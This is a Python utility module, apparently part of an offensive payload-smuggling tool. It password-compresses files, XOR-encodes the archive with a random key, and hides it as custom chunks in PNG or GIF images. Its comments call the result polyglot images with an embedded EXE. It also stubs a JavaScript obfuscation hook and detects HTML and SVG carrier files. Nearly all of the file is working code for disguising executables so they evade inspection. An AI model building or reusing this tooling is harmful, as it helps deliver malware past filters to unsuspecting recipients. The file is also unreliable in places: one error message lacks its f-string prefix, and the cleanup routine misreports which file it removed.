from core.logging.debug import logging
from core.operations.chunks import CustomImageChunk
import base64
import py7zr
import os
import random
import string
import pyminizip
import magic

def cleanup():
    TempFile = []
    for TempFile in ['temp.7z', 'temp.zip']:
        if os.path.exists(TempFile):
            os.remove(TempFile)
    print(f"\033[91m[Cleanup] Removed {TempFile}\033[0m")

def DisplayBanner(path):
    with open(path, 'r') as file:
        print(file.read())

def RandomizeVar():
    return ''.join(random.choices(string.ascii_letters, k=5))

# Added in case extra layer of obfuscation is required in JS
def ObfuscateJS(JScode):
    return JScode

def EncodeXOR(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def IdentifyFileType(FilePath):
    mime = magic.Magic(mime=True)
    mime_type = mime.from_file(FilePath)
    if 'html' in mime_type:
        return 'html'
    elif 'svg' in mime_type:
        return 'svg'
    return None

## Convert the given file to its base64 representation.
def Base64Encode(filename):
    logging.debug(f"Converting {filename} to base64.")
    with open(filename, "rb") as file:
        return base64.b64encode(file.read()).decode('utf-8')
    
def CompressFileDir(FileOrDirectory, password, format='7z'):
    ofile = 'temp.7z' if format == '7z' else 'temp.zip'
    logging.debug(f"Compressing {FileOrDirectory} with password [{password}] using {format} format.")
    try:
        # Check if input path is a file or directory
        if os.path.isfile(FileOrDirectory):
            # Compress a single file
            if format == '7z':
                with py7zr.SevenZipFile(ofile, mode='w', password=password) as archive:
                    archive.write(FileOrDirectory, os.path.basename(FileOrDirectory))
            elif format == 'zip':
                # Compression level 5, ZIP stores password in plain text, use for compatibility only
                pyminizip.compress(FileOrDirectory, None, ofile, password, 5)
        elif os.path.isdir(FileOrDirectory):
            # Compress all files in a directory
            FilesList = [os.path.join(FileOrDirectory, f) for f in os.listdir(FileOrDirectory) if os.path.isfile(os.path.join(FileOrDirectory, f))]
            print(f"\033[92mFiles found in the Directory {os.path.abspath(FileOrDirectory)}/:\033[0m")
            for files in FilesList:
                print(f"\033[92m  - {files}\033[0m")
            if format == '7z':
                with py7zr.SevenZipFile(ofile, mode='w', password=password) as archive:
                    for fname in FilesList:
                        archive.write(fname, os.path.relpath(fname, FileOrDirectory))
            elif format == 'zip':
                pyminizip.compress_multiple(FilesList, [], ofile, password, 5)
        else:
            raise ValueError(f"Invalid path or unsupported file type: {FileOrDirectory}")
    except Exception as e:
        logging.error(f"Error during compression: {e}")
        raise
    return ofile

## Embed EXE inside PNG/GIF (Polyglots)
def embed(PathToImageFile, PathToZIPFile, OutputFilePath, ImageType):
    with open(PathToImageFile, 'rb') as f:
        logging.debug(f"Reading {ImageType.upper()} file")
        ImageData = f.read()
    
    with open(PathToZIPFile, 'rb') as f:
        logging.debug(f"Reading compressed file")
        CompressedData = f.read()
        
    # Generate a random XOR key of 16 bytes
    KeyXOR = os.urandom(16)
    print(f"\n\033[92mGenerated XOR Key: {KeyXOR.hex()}\033[0m\n")

    # XOR encode the EXE data
    EncodedDataXOR = EncodeXOR(CompressedData, KeyXOR)

    # Create a custom chunk to hold the XOR key
    KeyChunk = CustomImageChunk(b"xkEy", KeyXOR, ImageType)
    HiddenDataChunk = CustomImageChunk(b"exEf", EncodedDataXOR, ImageType)

    if ImageType == 'png':
        # Embed the chunk into the PNG data
        # The last 12 bytes of a PNG file are always the IEND chunk (00 00 00 00 49 45 4E 44 AE 42 60 82)
        SignatureEOF = b"\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82"
    elif ImageType == 'gif':
        SignatureEOF = b"\x00\x3B"
    else:
        raise ValueError("Unsupported image type")

    EOFposition = ImageData.rfind(SignatureEOF)
    if EOFposition == -1:
        print("Invalid {ImageType.upper()} file.")
        exit(1)

    DataLength = len(EncodedDataXOR)
    #print(f"EXE LENGTH: {DataLength}")
    DataLengthInHex = f"{DataLength:08x}"  # Convert to 8-character hex string
    DataLengthInBytes = bytes.fromhex(DataLengthInHex)
    # Create a new PNG/GIF data with the embedded EXE chunk
    if ImageType == 'png':
        PolyglotImageData = ImageData[:EOFposition] + KeyChunk + HiddenDataChunk + ImageData[EOFposition:]
    elif ImageType == 'gif':
        PolyglotImageData = ImageData[:EOFposition] + KeyChunk + HiddenDataChunk + DataLengthInBytes + ImageData[EOFposition:]
    logging.debug(f"Creating new {ImageType.upper()} with embedded EXE chunk")

    with open(OutputFilePath, "wb") as f:
        f.write(PolyglotImageData)